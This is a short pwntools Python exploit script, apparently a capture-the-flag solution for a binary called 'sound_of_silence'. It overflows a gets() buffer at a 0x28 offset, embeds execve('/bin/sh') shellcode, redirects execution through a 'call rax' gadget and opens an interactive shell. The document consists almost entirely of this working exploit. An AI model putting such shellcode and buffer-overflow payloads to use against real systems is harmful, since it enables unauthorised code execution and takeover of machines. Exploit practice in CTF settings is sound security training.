from pwn import * 

'''
gets() at var char *s @ stack - 0x28

0x0000000000401014 : call rax
'''

def debug(p):
	pid = util.proc.pidof(p)[0]
	print(f"Pid is: {pid}")
	util.proc.wait_for_debugger(pid)

context.binary = binary = ELF("./sound_of_silence", checksec=False)
#context.log_level = "debug"
#static_library = ELF("./glibc/libc.so.6")

system_plt_address = p64(binary.plt.system)
call_rax = p64(0x0000000000401014)

payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += b"A"*(0x28-len(payload))
payload += call_rax

p = process()

#debug(p)

p.recvuntil(b">> ")
p.sendline(payload)
p.interactive()

